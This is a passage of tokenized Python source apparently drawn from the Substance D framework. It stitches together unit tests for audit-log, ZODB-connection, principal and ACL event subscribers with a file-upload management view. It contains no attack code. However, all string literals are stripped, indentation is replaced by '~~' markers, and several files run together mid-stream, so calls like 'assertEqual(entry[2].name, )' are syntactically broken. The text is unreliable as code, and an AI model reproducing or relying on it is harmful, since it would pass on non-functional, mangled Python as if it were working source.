entries = list ( auditlog . entries ) \n 
entry = entries [ 0 ] \n 
self . assertEqual ( entry [ 0 ] , 0 ) \n 
self . assertEqual ( entry [ 1 ] , 0 ) \n 
self . assertEqual ( entry [ 2 ] . name , ) \n 
self . assertEqual ( entry [ 2 ] . oid , 5 ) \n 
self . assertEqual ( \n 
json . loads ( entry [ 2 ] . payload ) , \n 
{ \n 
: entry [ 2 ] . timestamp , \n 
: , \n 
: , \n 
: { : 1 , : } , \n 
: , \n 
: \n 
} \n 
\n 
) \n 
\n 
~~ @ mock . patch ( ) \n 
def test_it_nolog ( self , mock_get_auditlog ) : \n 
~~~ mock_get_auditlog . side_effect = lambda c : None \n 
event = Dummy ( ) \n 
context = testing . DummyResource ( ) \n 
context . __oid__ = 5 \n 
event . object = context \n 
self . assertEqual ( self . _callFUT ( event ) , None ) \n 
\n 
~~ ~~ _marker = object ( ) \n 
\n 
class Test_content_added_moved_or_duplicated ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . request = testing . DummyRequest ( ) \n 
self . config = testing . setUp ( request = self . request ) \n 
\n 
~~ def tearDown ( self ) : \n 
~~~ testing . tearDown ( ) \n 
\n 
~~ def _callFUT ( self , event ) : \n 
~~~ from . . subscribers import content_added_moved_or_duplicated \n 
return content_added_moved_or_duplicated ( event ) \n 
\n 
~~ @ mock . patch ( ) \n 
def test_it_added ( self , mock_get_auditlog ) : \n 
~~~ auditlog = _makeAuditLog ( ) \n 
mock_get_auditlog . side_effect = lambda c : auditlog \n 
self . request . user = Dummy ( { : 1 , : } ) \n 
event = _makeEvent ( ) \n 
self . _callFUT ( event ) \n 
self . assertEqual ( len ( auditlog ) , 1 ) \n 
entries = list ( auditlog . entries ) \n 
entry = entries [ 0 ] \n 
self . assertEqual ( entry [ 0 ] , 0 ) \n 
self . assertEqual ( entry [ 1 ] , 0 ) \n 
self . assertEqual ( entry [ 2 ] . name , ) \n 
self . assertEqual ( entry [ 2 ] . oid , 10 ) \n 
self . assertEqual ( \n 
json . loads ( entry [ 2 ] . payload ) , \n 
{ \n 
: , \n 
: 10 , \n 
: , \n 
: { : 1 , : } , \n 
: , \n 
: entry [ 2 ] . timestamp , \n 
: 5 \n 
\n 
} \n 
) \n 
\n 
~~ @ mock . patch ( ) \n 
def test_it_added_noscribe ( self , mock_get_auditlog ) : \n 
~~~ mock_get_auditlog . side_effect = lambda c : None \n 
event = _makeEvent ( ) \n 
self . _callFUT ( event ) # does not throw an exception \n 
\n 
~~ @ mock . patch ( ) \n 
def test_it_moved ( self , mock_get_auditlog ) : \n 
~~~ auditlog = _makeAuditLog ( ) \n 
mock_get_auditlog . side_effect = lambda c : auditlog \n 
self . request . user = Dummy ( { : 1 , : } ) \n 
event = _makeEvent ( ) \n 
event . moving = True \n 
event . duplicating = None \n 
self . _callFUT ( event ) \n 
self . assertEqual ( len ( auditlog ) , 1 ) \n 
entries = list ( auditlog . entries ) \n 
entry = entries [ 0 ] \n 
self . assertEqual ( entry [ 0 ] , 0 ) \n 
self . assertEqual ( entry [ 1 ] , 0 ) \n 
self . assertEqual ( entry [ 2 ] . name , ) \n 
self . assertEqual ( entry [ 2 ] . oid , 10 ) \n 
self . assertEqual ( \n 
json . loads ( entry [ 2 ] . payload ) , \n 
{ \n 
: , \n 
: 10 , \n 
: , \n 
: { : 1 , : } , \n 
: , \n 
: entry [ 2 ] . timestamp , \n 
: 5 \n 
\n 
} \n 
) \n 
\n 
~~ @ mock . patch ( ) \n 
def test_it_duplicated ( self , mock_get_auditlog ) : \n 
~~~ auditlog = _makeAuditLog ( ) \n 
mock_get_auditlog . side_effect = lambda c : auditlog \n 
self . request . user = Dummy ( { : 1 , : } ) \n 
event = _makeEvent ( ) \n 
event . moving = None \n 
event . duplicating = True \n 
self . _callFUT ( event ) \n 
self . assertEqual ( len ( auditlog ) , 1 ) \n 
entries = list ( auditlog . entries ) \n 
entry = entries [ 0 ] \n 
self . assertEqual ( entry [ 0 ] , 0 ) \n 
self . assertEqual ( entry [ 1 ] , 0 ) \n 
self . assertEqual ( entry [ 2 ] . name , ) \n 
self . assertEqual ( entry [ 2 ] . oid , 10 ) \n 
self . assertEqual ( \n 
json . loads ( entry [ 2 ] . payload ) , \n 
{ \n 
: , \n 
: 10 , \n 
: , \n 
: { : 1 , : } , \n 
: , \n 
: entry [ 2 ] . timestamp , \n 
: 5 \n 
\n 
} \n 
) \n 
\n 
~~ ~~ class Test_content_removed ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . request = testing . DummyRequest ( ) \n 
self . config = testing . setUp ( request = self . request ) \n 
\n 
~~ def tearDown ( self ) : \n 
~~~ testing . tearDown ( ) \n 
\n 
~~ def _callFUT ( self , event ) : \n 
~~~ from . . subscribers import content_removed \n 
return content_removed ( event ) \n 
\n 
~~ def test_it_moving ( self ) : \n 
~~~ event = Dummy ( ) \n 
event . moving = True \n 
self . assertEqual ( self . _callFUT ( event ) , None ) \n 
\n 
~~ @ mock . patch ( ) \n 
def test_it ( self , mock_get_auditlog ) : \n 
~~~ auditlog = _makeAuditLog ( ) \n 
mock_get_auditlog . side_effect = lambda c : auditlog \n 
self . request . user = Dummy ( { : 1 , : } ) \n 
event = _makeEvent ( ) \n 
event . moving = None \n 
event . duplicating = None \n 
self . _callFUT ( event ) \n 
self . assertEqual ( len ( auditlog ) , 1 ) \n 
entries = list ( auditlog . entries ) \n 
entry = entries [ 0 ] \n 
self . assertEqual ( entry [ 0 ] , 0 ) \n 
self . assertEqual ( entry [ 1 ] , 0 ) \n 
self . assertEqual ( entry [ 2 ] . name , ) \n 
self . assertEqual ( entry [ 2 ] . oid , 10 ) \n 
self . assertEqual ( \n 
json . loads ( entry [ 2 ] . payload ) , \n 
{ \n 
: , \n 
: 10 , \n 
: , \n 
: { : 1 , : } , \n 
: , \n 
: entry [ 2 ] . timestamp , \n 
: 5 \n 
\n 
} \n 
) \n 
\n 
\n 
\n 
~~ ~~ class Test_content_modified ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . request = testing . DummyRequest ( ) \n 
self . config = testing . setUp ( request = self . request ) \n 
\n 
~~ def tearDown ( self ) : \n 
~~~ testing . tearDown ( ) \n 
\n 
~~ def _callFUT ( self , event ) : \n 
~~~ from . . subscribers import content_modified \n 
return content_modified ( event ) \n 
\n 
~~ @ mock . patch ( ) \n 
def test_it_noscribe ( self , mock_get_auditlog ) : \n 
~~~ mock_get_auditlog . side_effect = lambda c : None \n 
event = Dummy ( ) \n 
context = testing . DummyResource ( ) \n 
event . object = context \n 
self . assertEqual ( self . _callFUT ( event ) , None ) \n 
\n 
~~ @ mock . patch ( ) \n 
def test_it ( self , mock_get_auditlog ) : \n 
~~~ auditlog = _makeAuditLog ( ) \n 
mock_get_auditlog . side_effect = lambda c : auditlog \n 
self . request . user = Dummy ( { : 1 , : } ) \n 
event = Dummy ( ) \n 
context = testing . DummyResource ( ) \n 
context . __oid__ = 5 \n 
event . registry = _makeRegistry ( ) \n 
event . object = context \n 
self . _callFUT ( event ) \n 
self . assertEqual ( len ( auditlog ) , 1 ) \n 
entries = list ( auditlog . entries ) \n 
entry = entries [ 0 ] \n 
self . assertEqual ( entry [ 0 ] , 0 ) \n 
self . assertEqual ( entry [ 1 ] , 0 ) \n 
self . assertEqual ( entry [ 2 ] . name , ) \n 
self . assertEqual ( entry [ 2 ] . oid , 5 ) \n 
self . assertEqual ( \n 
json . loads ( entry [ 2 ] . payload ) , \n 
{ \n 
: 5 , \n 
: { : 1 , : } , \n 
: , \n 
: , \n 
: entry [ 2 ] . timestamp , \n 
} , \n 
) \n 
\n 
~~ ~~ class Test_logged_in ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . request = testing . DummyRequest ( ) \n 
self . config = testing . setUp ( request = self . request ) \n 
\n 
~~ def tearDown ( self ) : \n 
~~~ testing . tearDown ( ) \n 
\n 
~~ def _callFUT ( self , event ) : \n 
~~~ from . . subscribers import logged_in \n 
return logged_in ( event ) \n 
\n 
~~ @ mock . patch ( ) \n 
def test_it_noscribe ( self , mock_get_auditlog ) : \n 
~~~ mock_get_auditlog . side_effect = lambda c : None \n 
event = Dummy ( ) \n 
event . request = Dummy ( ) \n 
context = testing . DummyResource ( ) \n 
event . request . context = context \n 
self . assertEqual ( self . _callFUT ( event ) , None ) \n 
\n 
~~ @ mock . patch ( ) \n 
def test_it_user_has_oid ( self , mock_get_auditlog ) : \n 
~~~ auditlog = _makeAuditLog ( ) \n 
mock_get_auditlog . side_effect = lambda c : auditlog \n 
event = Dummy ( ) \n 
event . request = Dummy ( ) \n 
context = testing . DummyResource ( ) \n 
event . request . context = context \n 
user = Dummy ( ) \n 
user . __oid__ = 5 \n 
event . user = user \n 
event . login = \n 
self . _callFUT ( event ) \n 
self . assertEqual ( len ( auditlog ) , 1 ) \n 
entries = list ( auditlog . entries ) \n 
entry = entries [ 0 ] \n 
self . assertEqual ( entry [ 0 ] , 0 ) \n 
self . assertEqual ( entry [ 1 ] , 0 ) \n 
self . assertEqual ( entry [ 2 ] . name , ) \n 
self . assertEqual ( entry [ 2 ] . oid , None ) \n 
self . assertEqual ( \n 
json . loads ( entry [ 2 ] . payload ) , \n 
{ \n 
: 5 , \n 
: , \n 
: entry [ 2 ] . timestamp , \n 
} , \n 
) \n 
\n 
~~ @ mock . patch ( ) \n 
def test_it_user_has_no_oid ( self , mock_get_auditlog ) : \n 
~~~ auditlog = _makeAuditLog ( ) \n 
mock_get_auditlog . side_effect = lambda c : auditlog \n 
event = Dummy ( ) \n 
event . request = Dummy ( ) \n 
context = testing . DummyResource ( ) \n 
event . request . context = context \n 
user = Dummy ( ) \n 
event . user = user \n 
event . login = \n 
self . _callFUT ( event ) \n 
self . assertEqual ( len ( auditlog ) , 1 ) \n 
entries = list ( auditlog . entries ) \n 
entry = entries [ 0 ] \n 
self . assertEqual ( entry [ 0 ] , 0 ) \n 
self . assertEqual ( entry [ 1 ] , 0 ) \n 
self . assertEqual ( entry [ 2 ] . name , ) \n 
self . assertEqual ( entry [ 2 ] . oid , None ) \n 
self . assertEqual ( \n 
json . loads ( entry [ 2 ] . payload ) , \n 
{ \n 
: None , \n 
: , \n 
: entry [ 2 ] . timestamp , \n 
} , \n 
) \n 
\n 
~~ ~~ class Test_root_added ( unittest . TestCase ) : \n 
~~~ def _callFUT ( self , event ) : \n 
~~~ from . . subscribers import root_added \n 
return root_added ( event ) \n 
\n 
~~ @ mock . patch ( ) \n 
def test_it ( self , mock_set_auditlog ) : \n 
~~~ event = Dummy ( ) \n 
root = Dummy ( ) \n 
def is_set ( _root ) : \n 
~~~ self . assertEqual ( _root , root ) \n 
~~ mock_set_auditlog . side_effect = is_set \n 
event . object = root \n 
self . _callFUT ( event ) \n 
\n 
~~ ~~ class Dummy ( object ) : \n 
~~~ def __init__ ( self , kw = None ) : \n 
~~~ if kw : \n 
~~~ self . __dict__ . update ( kw ) \n 
\n 
~~ ~~ ~~ class DummyContentRegistry ( object ) : \n 
~~~ def typeof ( self , content ) : \n 
~~~ return \n 
\n 
~~ ~~ def _makeAuditLog ( ) : \n 
~~~ from substanced . audit import AuditLog \n 
auditlog = AuditLog ( ) \n 
return auditlog \n 
\n 
~~ def _makeRegistry ( ) : \n 
~~~ registry = Dummy ( ) \n 
registry . content = DummyContentRegistry ( ) \n 
return registry \n 
\n 
~~ def _makeEvent ( ) : \n 
~~~ event = Dummy ( ) \n 
event . moving = None \n 
event . duplicating = None \n 
event . parent = testing . DummyResource ( ) \n 
event . parent . __oid__ = 10 \n 
event . name = \n 
context = testing . DummyResource ( ) \n 
context . __oid__ = 5 \n 
context . __parent__ = event . parent \n 
event . registry = _makeRegistry ( ) \n 
event . object = context \n 
event . old_acl = \n 
event . new_acl = \n 
return event \n 
\n 
~~ import unittest \n 
from pyramid import testing \n 
\n 
class Test_root_factory ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . config = testing . setUp ( ) \n 
\n 
~~ def tearDown ( self ) : \n 
~~~ testing . tearDown ( ) \n 
\n 
~~ def _callFUT ( self , request , transaction , get_connection , evolve_packages ) : \n 
~~~ from . . import root_factory \n 
return root_factory ( request , transaction , get_connection , \n 
evolve_packages ) \n 
\n 
~~ def _makeRequest ( self , app_root = None ) : \n 
~~~ request = Dummy ( ) \n 
request . registry = DummyRegistry ( ) \n 
request . registry . content = Dummy ( ) \n 
request . registry . content . create = lambda * arg : app_root \n 
return request \n 
\n 
~~ def test_without_app_root ( self ) : \n 
~~~ txn = DummyTransaction ( ) \n 
root = { } \n 
gc = Dummy_get_connection ( root ) \n 
ep = DummyFunction ( True ) \n 
app_root = object ( ) \n 
request = self . _makeRequest ( app_root ) \n 
result = self . _callFUT ( request , txn , gc , ep ) \n 
self . assertEqual ( result , app_root ) \n 
self . assertTrue ( txn . committed ) \n 
self . assertTrue ( txn . savepointed ) \n 
self . assertTrue ( ep . called ) \n 
\n 
~~ def test_with_app_root ( self ) : \n 
~~~ txn = DummyTransaction ( ) \n 
app_root = object ( ) \n 
root = { : app_root } \n 
gc = Dummy_get_connection ( root ) \n 
ep = DummyFunction ( True ) \n 
request = testing . DummyRequest ( ) \n 
result = self . _callFUT ( request , txn , gc , ep ) \n 
self . assertEqual ( result , app_root ) \n 
self . assertFalse ( txn . committed ) \n 
\n 
~~ ~~ class Test_includeme ( unittest . TestCase ) : \n 
~~~ def test_it ( self ) : \n 
~~~ from . . import ( \n 
includeme , \n 
connection_opened , \n 
connection_will_close , \n 
ZODBConnectionOpened , \n 
ZODBConnectionWillClose , \n 
) \n 
config = DummyConfig ( ) \n 
includeme ( config ) \n 
self . assertEqual ( \n 
config . subscriptions , \n 
[ ( connection_opened , ZODBConnectionOpened ) , \n 
( connection_will_close , ZODBConnectionWillClose ) , \n 
] \n 
) \n 
\n 
~~ ~~ class Test_connection_opened ( unittest . TestCase ) : \n 
~~~ def test_it ( self ) : \n 
~~~ from . . import connection_opened \n 
event = DummyEvent ( ) \n 
connection_opened ( event ) \n 
self . assertEqual ( event . request . _zodb_tx_counts , ( 0 , 0 ) ) \n 
\n 
~~ ~~ class Test_connection_will_close ( unittest . TestCase ) : \n 
~~~ def _callFUT ( self , event , statsd_incr ) : \n 
~~~ from . . import connection_will_close \n 
return connection_will_close ( event , statsd_incr ) \n 
\n 
~~ def test_no_tx_counts ( self ) : \n 
~~~ event = DummyEvent ( ) \n 
result = self . _callFUT ( event , None ) \n 
self . assertEqual ( result , None ) # doesnt fail \n 
\n 
~~ def test_with_postitive_tx_counts ( self ) : \n 
~~~ event = DummyEvent ( 5 , 5 ) \n 
event . request . _zodb_tx_counts = ( 1 , 1 ) \n 
L = [ ] \n 
def statsd_incr ( name , num , registry = None ) : \n 
~~~ L . append ( ( name , num ) ) \n 
~~ self . _callFUT ( event , statsd_incr ) \n 
self . assertEqual ( \n 
L , \n 
[ ( , 4 ) , ( , 4 ) ] \n 
) \n 
\n 
~~ def test_with_zero_tx_counts ( self ) : \n 
~~~ event = DummyEvent ( 1 , 1 ) \n 
event . request . _zodb_tx_counts = ( 1 , 1 ) \n 
L = [ ] \n 
self . _callFUT ( event , None ) \n 
self . assertEqual ( \n 
L , \n 
[ ] \n 
) \n 
\n 
~~ ~~ class DummyTransaction ( object ) : \n 
~~~ committed = False \n 
savepointed = False \n 
def commit ( self ) : \n 
~~~ self . committed = True \n 
\n 
~~ def savepoint ( self ) : \n 
~~~ self . savepointed = True \n 
\n 
~~ ~~ class Dummy_get_connection ( object ) : \n 
~~~ def __init__ ( self , root ) : \n 
~~~ self . _root = root \n 
\n 
~~ def root ( self ) : \n 
~~~ return self . _root \n 
\n 
~~ def __call__ ( self , request ) : \n 
~~~ return self \n 
\n 
~~ ~~ class DummyFunction ( object ) : \n 
~~~ called = False \n 
def __init__ ( self , result ) : \n 
~~~ self . result = result \n 
~~ def __call__ ( self , * args , ** kw ) : \n 
~~~ self . called = True \n 
self . args = args \n 
self . kw = kw \n 
return self . result \n 
\n 
~~ ~~ class Dummy ( object ) : \n 
~~~ pass \n 
\n 
~~ class DummyRegistry ( object ) : \n 
~~~ def notify ( self , event ) : \n 
~~~ self . event = event \n 
\n 
~~ ~~ class DummyConfig ( object ) : \n 
~~~ def __init__ ( self ) : \n 
~~~ self . subscriptions = [ ] \n 
~~ def add_subscriber ( self , fn , event_type ) : \n 
~~~ self . subscriptions . append ( ( fn , event_type ) ) \n 
\n 
~~ ~~ class DummyConnection ( object ) : \n 
~~~ def __init__ ( self , loads , stores ) : \n 
~~~ self . loads = loads \n 
self . stores = stores \n 
\n 
~~ def getTransferCounts ( self ) : \n 
~~~ return ( self . loads , self . stores ) \n 
\n 
~~ ~~ class DummyEvent ( object ) : \n 
~~~ def __init__ ( self , loads = 0 , stores = 0 ) : \n 
~~~ self . request = testing . DummyRequest ( ) \n 
self . conn = DummyConnection ( loads , stores ) \n 
~~ ~~ import pkg_resources \n 
import mimetypes \n 
import colander \n 
import deform . schema \n 
\n 
from pyramid . httpexceptions import HTTPFound \n 
from pyramid . response import Response \n 
from pyramid . security import NO_PERMISSION_REQUIRED \n 
\n 
from . . form import FormView \n 
\n 
from . . file import ( \n 
FilePropertiesSchema , \n 
FileUploadTempStore , \n 
file_upload_widget , \n 
file_name_node , \n 
USE_MAGIC , \n 
) \n 
\n 
from . . interfaces import ( \n 
IFile , \n 
IFolder , \n 
) \n 
\n 
from . . sdi import mgmt_view \n 
\n 
@ mgmt_view ( \n 
context = IFile , \n 
name = , \n 
permission = , \n 
tab_condition = False , \n 
http_cache = 0 , \n 
) \n 
def view_file ( context , request ) : \n 
~~~ return context . get_response ( request = request ) \n 
\n 
~~ @ mgmt_view ( \n 
context = IFile , \n 
name = , \n 
tab_title = , \n 
permission = \n 
) \n 
def view_tab ( context , request ) : \n 
~~~ return HTTPFound ( location = request . sdiapi . mgmt_path ( context ) ) \n 
\n 
~~ class AddFileSchema ( FilePropertiesSchema ) : \n 
~~~ file = colander . SchemaNode ( \n 
deform . schema . FileData ( ) , \n 
widget = file_upload_widget , \n 
missing = colander . null , \n 
) \n 
\n 
~~ @ colander . deferred \n 
def name_or_file ( node , kw ) : \n 
~~~ def _name_or_file ( node , struct ) : \n 
~~~ if not struct [ ] and not struct [ ] : \n 
~~~ raise colander . Invalid ( node , ) \n 
~~ if not struct [ ] : \n 
~~~ filename = struct [ ] . get ( ) \n 
if filename : \n 
~~~ name_node = file_name_node . bind ( \n 
context = kw [ ] , request = kw [ ] \n 
) \n 
name_node . validator ( node [ ] , filename ) \n 
~~ else : \n 
~~~ raise colander . Invalid ( \n 
node , \n 
\n 
) \n 
~~ ~~ ~~ return _name_or_file \n 
\n 
~~ @ mgmt_view ( \n 
context = IFolder , \n 
name = , \n 
tab_title = , \n 
permission = , \n 
renderer = , \n 
addable_content = , \n 
tab_condition = False \n 
) \n 
class AddFileView ( FormView ) : \n 
~~~ title = \n 
schema = AddFileSchema ( validator = name_or_file ) . clone ( ) \n 
schema [ ] . missing = colander . null \n 
schema [ ] . missing = colander . null \n 
buttons = ( , ) \n 
\n 
def _makeob ( self , stream , title , mimetype ) : \n 
~~~ return self . request . registry . content . create ( \n 
, \n 
stream = stream , \n 
mimetype = mimetype , \n 
title = title , \n 
) \n 
\n 
~~ def add_success ( self , appstruct ) : \n 
~~~ name = appstruct [ ] \n 
title = appstruct [ ] or None \n 
filedata = appstruct [ ] \n 
mimetype = appstruct [ ] or USE_MAGIC \n 
stream = None \n 
filename = None \n 
if filedata : \n 
~~~ filename = filedata [ ] \n 
stream = filedata [ ] \n 
if stream : \n 
~~~ stream . seek ( 0 ) \n 
~~ else : \n 
~~~ stream = None \n 
~~ ~~ name = name or filename \n 
fileob = self . _makeob ( stream , title , mimetype ) \n 
self . context [ name ] = fileob \n 
tmpstore = FileUploadTempStore ( self . request ) \n 
tmpstore . clear ( ) \n 
return HTTPFound ( self . request . sdiapi . mgmt_path ( self . context ) ) \n 
\n 
~~ ~~ onepixel = pkg_resources . resource_filename ( \n 
, ) \n 
\n 
\n 
# which the user would have to put there anyway \n 
@ mgmt_view ( \n 
name = , \n 
tab_condition = False , \n 
permission = NO_PERMISSION_REQUIRED \n 
) \n 
def preview_image_upload ( request ) : \n 
~~~ uid = request . subpath [ 0 ] \n 
tempstore = FileUploadTempStore ( request ) \n 
filedata = tempstore . get ( uid , { } ) \n 
fp = filedata . get ( ) \n 
filename = \n 
if fp is not None : \n 
~~~ fp . seek ( 0 ) \n 
filename = filedata [ ] \n 
~~ mimetype = mimetypes . guess_type ( filename , strict = False ) [ 0 ] \n 
if not mimetype or not mimetype . startswith ( ) : \n 
~~~ mimetype = \n 
fp = open ( onepixel , ) \n 
~~ response = Response ( content_type = mimetype , app_iter = fp ) \n 
return response \n 
~~ import unittest \n 
from pyramid import testing \n 
\n 
class Test_principal_added ( unittest . TestCase ) : \n 
~~~ def _callFUT ( self , event ) : \n 
~~~ from . . subscribers import principal_added \n 
return principal_added ( event ) \n 
\n 
~~ def test_event_wo_loading_attr ( self ) : \n 
~~~ event = testing . DummyResource ( ) \n 
event . object = testing . DummyResource ( ) \n 
self . assertRaises ( AttributeError , self . _callFUT , event ) \n 
\n 
~~ def test_event_w_loading_True ( self ) : \n 
~~~ event = testing . DummyResource ( loading = True ) \n 
result = self . _callFUT ( event ) \n 
self . assertEqual ( result , None ) \n 
\n 
~~ def test_wo_principals_service ( self ) : \n 
~~~ from zope . interface import directlyProvides \n 
from ... interfaces import IFolder \n 
event = testing . DummyResource ( loading = False ) \n 
root = testing . DummyResource ( ) \n 
directlyProvides ( root , IFolder ) \n 
event . object = root [ ] = testing . DummyResource ( ) \n 
self . assertRaises ( ValueError , self . _callFUT , event ) \n 
\n 
~~ def test_user_not_in_groups ( self ) : \n 
~~~ from ... testing import make_site \n 
from ... interfaces import IUser \n 
site = make_site ( ) \n 
user = testing . DummyResource ( __provides__ = IUser ) \n 
site [ ] = user \n 
event = testing . DummyResource ( object = user , loading = False ) \n 
self . _callFUT ( event ) # doesnt blow up \n 
\n 
~~ def test_user_in_groups ( self ) : \n 
~~~ from ... testing import make_site \n 
from ... interfaces import IUser \n 
site = make_site ( ) \n 
groups = site [ ] [ ] \n 
groups [ ] = testing . DummyResource ( ) \n 
user = testing . DummyResource ( __provides__ = IUser ) \n 
site [ ] = user \n 
event = testing . DummyResource ( object = user , loading = False ) \n 
self . assertRaises ( ValueError , self . _callFUT , event ) \n 
\n 
~~ def test_group_not_in_users ( self ) : \n 
~~~ from ... testing import make_site \n 
site = make_site ( ) \n 
group = testing . DummyResource ( ) \n 
site [ ] = group \n 
event = testing . DummyResource ( object = group , loading = False ) \n 
self . _callFUT ( event ) # doesnt blow up \n 
\n 
~~ def test_group_in_users ( self ) : \n 
~~~ from ... testing import make_site \n 
site = make_site ( ) \n 
users = site [ ] [ ] \n 
users [ ] = testing . DummyResource ( ) \n 
group = testing . DummyResource ( ) \n 
site [ ] = group \n 
event = testing . DummyResource ( object = group , loading = False ) \n 
self . assertRaises ( ValueError , self . _callFUT , event ) \n 
\n 
~~ ~~ class Test_user_will_be_removed ( unittest . TestCase ) : \n 
~~~ def _callFUT ( self , event ) : \n 
~~~ from . . subscribers import user_will_be_removed \n 
return user_will_be_removed ( event ) \n 
\n 
~~ def test_loading ( self ) : \n 
~~~ event = testing . DummyResource ( loading = True , moving = None ) \n 
result = self . _callFUT ( event ) \n 
self . assertEqual ( result , None ) \n 
\n 
~~ def test_moving ( self ) : \n 
~~~ event = testing . DummyResource ( loading = False , moving = True ) \n 
result = self . _callFUT ( event ) \n 
self . assertEqual ( result , None ) \n 
\n 
~~ def test_it ( self ) : \n 
~~~ from ... interfaces import IFolder \n 
parent = testing . DummyResource ( __provides__ = IFolder ) \n 
user = testing . DummyResource ( ) \n 
reset = testing . DummyResource ( ) \n 
def commit_suicide ( ) : \n 
~~~ reset . committed = True \n 
~~ reset . commit_suicide = commit_suicide \n 
objectmap = DummyObjectMap ( ( reset , ) ) \n 
parent . __objectmap__ = objectmap \n 
parent [ ] = user \n 
event = testing . DummyResource ( object = user , loading = False , moving = None ) \n 
self . _callFUT ( event ) \n 
self . assertTrue ( reset . committed ) \n 
\n 
~~ def test_it_moving ( self ) : \n 
~~~ event = testing . DummyResource ( object = None , loading = False ) \n 
event . moving = True \n 
self . assertEqual ( self . _callFUT ( event ) , None ) \n 
\n 
~~ ~~ class Test_user_added ( unittest . TestCase ) : \n 
~~~ def _callFUT ( self , event ) : \n 
~~~ from . . subscribers import user_added \n 
return user_added ( event ) \n 
\n 
~~ def test_loading ( self ) : \n 
~~~ event = testing . DummyResource ( loading = True ) \n 
result = self . _callFUT ( event ) \n 
self . assertEqual ( result , None ) \n 
\n 
~~ def test_it_user_has_no_oid ( self ) : \n 
~~~ user = testing . DummyResource ( ) \n 
event = testing . DummyResource ( object = user , loading = False ) \n 
event . registry = DummyRegistry ( ) \n 
self . assertRaises ( AttributeError , self . _callFUT , event ) \n 
\n 
~~ def test_it ( self ) : \n 
~~~ from pyramid . security import Allow \n 
user = testing . DummyResource ( ) \n 
user . __oid__ = 1 \n 
event = testing . DummyResource ( object = user , loading = False ) \n 
event . registry = DummyRegistry ( ) \n 
self . _callFUT ( event ) \n 
self . assertEqual ( \n 
user . __acl__ , \n 
[ ( Allow , 1 , ( , \n 
, \n 
, \n 
) ) ] ) \n 
\n 
~~ ~~ class Test_acl_maybe_added ( unittest . TestCase ) : \n 
~~~ def _callFUT ( self , event ) : \n 
~~~ from . . subscribers import acl_maybe_added \n 
return acl_maybe_added ( event ) \n 
\n 
~~ def test_moving ( self ) : \n 
~~~ event = DummyEvent ( moving = True , loading = False ) \n 
self . assertEqual ( self . _callFUT ( event ) , False ) \n 
\n 
~~ def test_loading ( self ) : \n 
~~~ event = DummyEvent ( moving = None , loading = True ) \n 
self . assertEqual ( self . _callFUT ( event ) , False ) \n 
\n 
~~ def test_objectmap_is_None ( self ) : \n 
~~~ event = DummyEvent ( moving = None , object = None , loading = False ) \n 
self . assertEqual ( self . _callFUT ( event ) , None ) \n 
\n 
~~ def test_no_acls ( self ) : \n 
~~~ from substanced . interfaces import IFolder \n 
resource1 = testing . DummyResource ( __provides__ = IFolder ) \n 
resource2 = testing . DummyResource ( ) \n 
resource1 [ ] = resource2 \n 
objectmap = DummyObjectMap ( ) \n 
resource1 . __objectmap__ = objectmap \n 
event = DummyEvent ( moving = None , object = resource1 , loading = False ) \n 
self . _callFUT ( event ) \n 
self . assertEqual ( objectmap . connections , [ ] ) \n 
\n 
~~ def test_with_acls ( self ) : \n 
~~~ from ... interfaces import PrincipalToACLBearing \n 
from substanced . interfaces import IFolder \n 
resource1 = testing . DummyResource ( __provides__ = IFolder ) \n 
resource2 = testing . DummyResource ( ) \n 
resource1 [ ] = resource2 \n 
resource1 . __acl__ = [ ( None , , None ) , ( None , 1 , None ) ] \n 
resource2 . __acl__ = [ ( None , , None ) , ( None , 2 , None ) ] \n 
objectmap = DummyObjectMap ( ) \n 
resource1 . __objectmap__ = objectmap \n 
event = DummyEvent ( moving = None , object = resource1 , loading = False ) \n 
self . _callFUT ( event ) \n 
self . assertEqual ( \n 
objectmap . connections , \n 
[ ( 2 , resource2 , PrincipalToACLBearing ) , \n 
( 1 , resource1 , PrincipalToACLBearing ) ] \n 
) \n 
\n 
~~ ~~ class Test_acl_modified ( unittest . TestCase ) : \n 
~~~ def _callFUT ( self , event ) : \n 
~~~ from . . subscribers import acl_modified \n 
return acl_modified ( event ) \n 
\n 
~~ def test_objectmap_is_None ( self ) : \n 
~~~ event = DummyEvent ( object = None ) \n 
self . assertEqual ( self . _callFUT ( event ) , None ) \n 
\n 
~~ def test_gardenpath ( self ) : \n 
~~~ from ... interfaces import PrincipalToACLBearing \n 
resource = testing . DummyResource ( ) \n 
objectmap = DummyObjectMap ( ) \n 
resource . __objectmap__ = objectmap \n 
event = DummyEvent ( \n 
object = resource , \n 
new_acl = [ ( None , , None ) , ( None , 1 , None ) ] , \n 
old_acl = [ ( None , , None ) , ( None , 2 , None ) ] , \n 
) \n 
self . _callFUT ( event ) \n 
self . assertEqual ( \n 
objectmap . connections , \n 
[ ( 1 , resource , PrincipalToACLBearing ) ] \n 
) \n 
self . assertEqual ( \n 
objectmap . disconnections , \n 
[ ( 2 , resource , PrincipalToACLBearing ) ] \n 
) \n 
\n 
\n 
~~ ~~ class DummyObjectMap ( object ) : \n 
~~~ def __init__ ( self , result = ( ) ) : \n 
~~~ self . result = result \n 
self . connections = [ ] \n 
self . disconnections = [ ] \n 
\n 
~~ def targets ( self , object , reftype ) : \n 
~~~ return self . result \n 
\n 
~~ def connect ( self , source , target , reftype ) : \n 
~~~ self . connections . append ( ( source , target , reftype ) ) \n 
\n 
~~ def disconnect ( self , source , target , reftype ) : \n 
~~~ self . disconnections . append ( ( source , target , reftype ) ) \n 
\n 
~~ ~~ class DummyEvent ( object ) : \n 
~~~ def __init__ ( self , ** kw ) : \n 
~~~ self . __dict__ . update ( kw ) \n 
\n 
~~ ~~ class DummyRegistry ( object ) : \n 
~~~ def subscribers ( self , * arg ) : \n 
~~~ return \n 
\n 
~~ ~~ from pyramid . httpexceptions import ( \n 
HTTPForbidden , \n 
HTTPFound \n 
) \n 
from pyramid . renderers import get_renderer \n 
from pyramid . session import check_csrf_token \n 
from pyramid . security import ( \n 
remember , \n 
forget , \n 
Authenticated , \n 
NO_PERMISSION_REQUIRED , \n 
) \n 
\n 
from ... util import get_oid \n 
\n 
from . . import mgmt_view \n 
\n 
from substanced . interfaces import IUserLocator \n 
from substanced . principal import DefaultUserLocator \n 
from substanced . event import LoggedIn \n 
\n 
@ mgmt_view ( \n 
name = , \n 
